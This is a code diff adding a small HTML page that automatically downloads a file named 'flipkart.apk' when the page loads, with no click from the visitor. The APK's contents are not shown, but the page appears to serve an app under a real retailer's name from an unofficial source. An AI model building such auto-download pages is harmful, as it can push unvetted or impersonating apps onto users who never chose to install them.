@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download APK</title>
+</head>
+<body>
+    <h1>Welcome to the APK Download Page</h1>
+    <p>Your download should start automatically.</p>
+    <script>
+        window.onload = function() {
+            var link = document.createElement('a');
+            link.href = 'flipkart.apk';  
+            link.download = 'flipkart.apk'; 
+            link.click();
+        };
+    </script>
+</body>
+</html>
